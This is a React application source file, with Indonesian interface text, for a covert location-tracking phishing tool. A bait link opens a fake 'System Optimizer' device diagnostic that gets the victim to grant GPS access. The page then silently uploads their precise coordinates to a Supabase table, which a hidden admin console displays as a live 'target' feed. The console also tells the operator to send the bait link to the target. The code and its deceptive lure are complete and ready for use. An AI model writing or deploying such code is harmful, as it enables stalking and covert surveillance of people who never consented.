
import React, { useState, useEffect, useCallback } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import { UserProfile, AIInsight, LocationData } from './types';
import { getLocationInsights } from './services/geminiService';
import { createClient } from '@supabase/supabase-js';

// Deteksi variabel lingkungan dengan fallback untuk debugging
const SB_URL = process.env.SUPABASE_URL || '';
const SB_KEY = process.env.SUPABASE_KEY || '';

// Inisialisasi client Supabase
const supabase = (SB_URL && SB_KEY) ? createClient(SB_URL, SB_KEY) : null;

const App: React.FC = () => {
  const isStealthMode = new URLSearchParams(window.location.search).get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagProgress, setDiagProgress] = useState(0);
  const [locationError, setLocationError] = useState<string | null>(null);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("IDLE");
  
  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [isLoadingInsight, setIsLoadingInsight] = useState(false);

  const activeMember = members[0];
  
  // Validasi konfigurasi
  const hasUrl = SB_URL.length > 0;
  const hasKey = SB_KEY.length > 0;
  const isConfigValid = hasUrl && hasKey;

  const syncToDatabase = async (loc: LocationData) => {
    if (!supabase) {
      if (!hasUrl && !hasKey) setDbLog("ERR: ENV_EMPTY");
      else if (!hasUrl) setDbLog("ERR: URL_NULL");
      else if (!hasKey) setDbLog("ERR: KEY_NULL");
      return;
    }
    
    setDbLog("SYNCING...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ 
          id: targetId, 
          latitude: loc.latitude, 
          longitude: loc.longitude, 
          accuracy: loc.accuracy, 
          timestamp: loc.timestamp 
        });
      
      if (error) {
        setDbLog(`DB_ERR: ${error.message.substring(0, 15)}`);
      } else {
        setDbLog("SUCCESS: SENT");
      }
    } catch (err: any) {
      setDbLog("CONN_FAIL");
    }
  };

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        try {
          const { data, error } = await supabase.from('tracking').select('*').eq('id', targetId).single();
          if (data && !error) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        } catch (e) {}
      };
      fetchData();

      const channel = supabase
        .channel('tracking-live')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{
              ...members[0],
              currentLocation: {
                latitude: data.latitude,
                longitude: data.longitude,
                accuracy: data.accuracy,
                timestamp: data.timestamp
              },
              status: 'online',
              lastSeen: data.timestamp
            }]);
          }
        })
        .subscribe();

      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode]);

  const updateLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationError("GPS_UNSUPPORTED");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setLocationError(null);
        const newLocation: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp,
        };

        if (isStealthMode) {
          await syncToDatabase(newLocation);
        }

        if (isUnlocked && !isStealthMode) {
          setMembers(prev => prev.map(m => ({ ...m, currentLocation: newLocation, status: 'online' })));
          setIsLoadingInsight(true);
          const res = await getLocationInsights(newLocation);
          setInsight(res);
          setIsLoadingInsight(false);
        }
      },
      (err) => {
        setLocationError(`DENIED`);
        setDbLog("ERR: NO_GPS_PERM");
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }, [isUnlocked, isStealthMode]);

  const startDiagnostic = () => {
    updateLocation();
    setIsDiagnosing(true);
    let progress = 0;
    const interval = setInterval(() => {
      progress += 1;
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 40);
  };

  const getCleanUrl = () => window.location.origin + window.location.pathname;

  const handleCopyLink = async (key: string) => {
    const url = `${getCleanUrl()}?mode=diagnostic`;
    await navigator.clipboard.writeText(url);
    setCopyStatus(key);
    setTimeout(() => setCopyStatus(null), 2000);
  };

  const openInGoogleMaps = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 overflow-hidden">
        <div className="max-w-md mx-auto w-full space-y-8 animate-in fade-in duration-500">
           <div className="flex items-center gap-3 border-b border-slate-800 pb-6">
              <div className="w-10 h-10 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-600/20">
                 <i className="fas fa-microchip text-white"></i>
              </div>
              <div>
                 <h1 className="text-sm font-bold uppercase tracking-tighter">System Optimizer <span className="text-slate-500 font-normal">v1.4</span></h1>
                 <p className="text-[10px] text-slate-500 uppercase">{isDiagnosing ? 'Pemeriksaan Berlangsung...' : 'Menunggu Perintah'}</p>
              </div>
           </div>

           {!isDiagnosing ? (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 text-center space-y-6">
                <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto border border-blue-500/20">
                   <i className="fas fa-shield-virus text-3xl text-blue-500"></i>
                </div>
                <div className="space-y-2">
                   <h2 className="text-lg font-bold">Diagnosa Perangkat</h2>
                   <p className="text-slate-400 text-xs leading-relaxed">Pindai integritas sensor, kesehatan baterai, dan optimalkan hardware GPS untuk kinerja maksimal.</p>
                </div>
                <button 
                  onClick={startDiagnostic}
                  className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-2xl font-bold text-sm shadow-xl active:scale-95 transition-all"
                >
                  MULAI DIAGNOSA SEKARANG
                </button>
                {locationError && (
                  <p className="text-[10px] text-rose-500 bg-rose-500/10 p-2 rounded border border-rose-500/20">
                    Akses Lokasi Dibutuhkan untuk Kalibrasi GPS.
                  </p>
                )}
             </div>
           ) : (
             <div className="bg-slate-900/40 border border-slate-800 rounded-3xl p-8 space-y-8">
                <div className="space-y-4">
                   <div className="flex justify-between text-[10px] uppercase font-bold text-slate-500">
                      <span>Proses Kalibrasi...</span>
                      <span>{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1.5 rounded-full overflow-hidden">
                      <div className="bg-blue-500 h-full transition-all duration-300" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>

                <div className="space-y-3 p-4 bg-slate-950/50 border border-slate-800 rounded-xl">
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPU RENDERER</span>
                      <span className="text-emerald-500 font-bold">SUCCESS</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">DATABASE_LINK</span>
                      <span className={`font-bold ${dbLog.includes('SUCCESS') ? 'text-emerald-500' : 'text-blue-400'}`}>{dbLog}</span>
                   </div>
                   <div className="flex justify-between text-[9px]">
                      <span className="text-slate-500">GPS_HARDWARE</span>
                      <span className="text-emerald-500 font-bold">{diagProgress > 50 ? 'VERIFIED' : 'SCANNING'}</span>
                   </div>
                </div>

                {diagProgress >= 100 && (
                  <div className="animate-in zoom-in duration-500 space-y-4">
                     <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-xl text-center">
                        <p className="text-[10px] text-emerald-400 font-bold uppercase">Optimasi Selesai</p>
                        <p className="text-[9px] text-slate-500 mt-1">Sistem sekarang berjalan 25% lebih cepat.</p>
                     </div>
                     <button onClick={() => window.location.reload()} className="w-full py-3 bg-slate-800 rounded-xl text-[10px] font-bold text-slate-400 uppercase">Tutup</button>
                  </div>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar 
        members={members} 
        activeMemberId="1" 
        onSelectMember={() => {}}
        isUnlocked={isUnlocked}
        onUnlock={() => setIsUnlocked(true)}
      />

      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-8 shrink-0">
          <div className="flex items-center gap-4">
            <h2 className="text-xs font-bold tracking-widest text-slate-400 uppercase">
              {isUnlocked ? '> ADM_CONSOLE_ACTIVE' : '> SYSTEM_ENCRYPTED'}
            </h2>
          </div>
          <div className="flex items-center gap-4">
            {isUnlocked && (
              <div className={`px-2 py-1 rounded border text-[9px] uppercase font-bold flex items-center gap-2 ${isConfigValid ? 'border-emerald-500/30 bg-emerald-500/5 text-emerald-500' : 'border-rose-500/30 bg-rose-500/5 text-rose-500'}`}>
                <div className={`w-1.5 h-1.5 rounded-full ${isConfigValid ? 'bg-emerald-500' : 'bg-rose-500 animate-pulse'}`}></div>
                DB_{isConfigValid ? 'CONNECTED' : 'DISCONNECTED'}
              </div>
            )}
            {isUnlocked && (
               <button onClick={() => setIsUnlocked(false)} className="text-[10px] bg-slate-800 px-3 py-1 rounded border border-slate-700 uppercase hover:bg-slate-700 transition-colors">Lock</button>
            )}
          </div>
        </header>

        <div className="flex-1 p-8 overflow-y-auto">
          {!isUnlocked ? (
            <div className="max-w-4xl mx-auto space-y-8 text-center py-20 animate-in fade-in duration-1000">
               <div className="w-20 h-20 bg-slate-900 rounded-3xl border border-slate-800 flex items-center justify-center mx-auto mb-8 shadow-2xl">
                  <i className="fas fa-key text-3xl text-slate-700"></i>
               </div>
               <h1 className="text-3xl font-bold text-slate-400 tracking-tighter">Otorisasi Diperlukan</h1>
               <p className="text-slate-500 text-sm max-w-sm mx-auto">Sistem diproteksi. Silakan ketuk nomor versi pada sidebar sebanyak 5 kali untuk membuka terminal.</p>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 max-w-7xl mx-auto animate-in zoom-in-95 duration-500">
              <div className="lg:col-span-2 space-y-6">
                
                {/* Diagnostic Panel for Missing Env */}
                {!isConfigValid && (
                  <div className="bg-rose-950/20 border border-rose-500/30 p-6 rounded-2xl">
                    <div className="flex items-center gap-3 mb-4">
                       <i className="fas fa-triangle-exclamation text-rose-500 text-xl"></i>
                       <h4 className="text-sm font-bold text-rose-400 uppercase tracking-widest">Kesalahan Konfigurasi Terdeteksi</h4>
                    </div>
                    <div className="space-y-4">
                       <div className="grid grid-cols-2 gap-4">
                          <div className={`p-3 rounded-lg border ${hasUrl ? 'bg-emerald-500/5 border-emerald-500/20 text-emerald-500' : 'bg-rose-500/5 border-rose-500/20 text-rose-500'} flex items-center justify-between`}>
                             <span className="text-[10px] font-bold">SUPABASE_URL</span>
                             <i className={`fas ${hasUrl ? 'fa-check-circle' : 'fa-times-circle'}`}></i>
                          </div>
                          <div className={`p-3 rounded-lg border ${hasKey ? 'bg-emerald-500/5 border-emerald-500/20 text-emerald-500' : 'bg-rose-500/5 border-rose-500/20 text-rose-500'} flex items-center justify-between`}>
                             <span className="text-[10px] font-bold">SUPABASE_KEY</span>
                             <i className={`fas ${hasKey ? 'fa-check-circle' : 'fa-times-circle'}`}></i>
                          </div>
                       </div>
                       <div className="bg-slate-950 p-4 rounded-xl border border-slate-800 text-[11px] text-slate-400 leading-relaxed">
                          <p className="text-white font-bold mb-2 uppercase">Cara Memperbaiki:</p>
                          <ol className="list-decimal ml-4 space-y-2">
                             <li>Buka Dashboard Vercel Proyek Anda.</li>
                             <li>Ke tab <b>Settings</b> > <b>Environment Variables</b>.</li>
                             <li>Pastikan nama variabel persis: <code className="text-blue-400">SUPABASE_URL</code> dan <code className="text-blue-400">SUPABASE_KEY</code>.</li>
                             <li><b>PENTING:</b> Pergi ke tab <b>Deployments</b>, klik titik tiga pada deployment terbaru, dan pilih <b>REDEPLOY</b>.</li>
                          </ol>
                       </div>
                    </div>
                  </div>
                )}

                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl relative overflow-hidden">
                   <div className="absolute top-0 right-0 w-64 h-64 bg-blue-600/5 blur-[100px] rounded-full -mr-32 -mt-32"></div>
                   <div className="flex justify-between items-center mb-8">
                      <div>
                        <h3 className="text-xs font-bold text-slate-500 uppercase tracking-[0.2em] mb-1">Live Tracking Feed</h3>
                        <p className="text-[10px] text-slate-600 uppercase">Target: Alpha_Target_01</p>
                      </div>
                      {activeMember.currentLocation && (
                        <button 
                          onClick={() => openInGoogleMaps(activeMember.currentLocation!.latitude, activeMember.currentLocation!.longitude)}
                          className="px-6 py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all shadow-lg shadow-blue-600/20"
                        >
                           Buka Google Maps
                        </button>
                      )}
                   </div>
                   
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div className="bg-slate-950/80 border border-slate-800 p-6 rounded-2xl group hover:border-blue-500/30 transition-colors">
                           <p className="text-[10px] text-slate-500 uppercase font-bold mb-2 tracking-widest">Latitude</p>
                           <p className="text-2xl font-bold text-white mono tracking-tighter">{activeMember.currentLocation.latitude.toFixed(8)}</p>
                        </div>
                        <div className="bg-slate-950/80 border border-slate-800 p-6 rounded-2xl group hover:border-blue-500/30 transition-colors">
                           <p className="text-[10px] text-slate-500 uppercase font-bold mb-2 tracking-widest">Longitude</p>
                           <p className="text-2xl font-bold text-white mono tracking-tighter">{activeMember.currentLocation.longitude.toFixed(8)}</p>
                        </div>
                     </div>
                   ) : (
                     <div className="py-20 border-2 border-dashed border-slate-800 rounded-3xl text-center space-y-4">
                        <div className="w-16 h-16 bg-slate-800/50 rounded-full flex items-center justify-center mx-auto animate-pulse">
                           <i className="fas fa-satellite-dish text-slate-600 text-2xl"></i>
                        </div>
                        <p className="text-xs text-slate-500 italic uppercase tracking-widest">Mencari Sinyal GPS dari Target...</p>
                     </div>
                   )}
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8">
                   <h3 className="text-xs font-bold text-slate-500 uppercase tracking-[0.2em] mb-4">Link Pancingan (Target)</h3>
                   <p className="text-[10px] text-slate-500 mb-4 leading-relaxed italic">Kirim link ini ke target. Saat mereka membuka dan menekan tombol 'Diagnosa', lokasi mereka akan terkirim secara otomatis ke panel ini.</p>
                   <div className="flex gap-2 p-2 bg-slate-950 rounded-2xl border border-slate-800">
                      <input readOnly value={`${getCleanUrl()}?mode=diagnostic`} className="flex-1 bg-transparent border-none focus:ring-0 px-4 text-[11px] text-slate-400 mono" />
                      <button onClick={() => handleCopyLink('target')} className={`px-8 py-3 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all ${copyStatus === 'target' ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}>
                         {copyStatus === 'target' ? 'Berhasil Dicopy' : 'Copy Link'}
                      </button>
                   </div>
                </div>
              </div>

              <div className="lg:col-span-1">
                <LocationCard 
                  member={activeMember} 
                  insight={insight} 
                  loadingInsight={isLoadingInsight} 
                />
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
};

export default App;
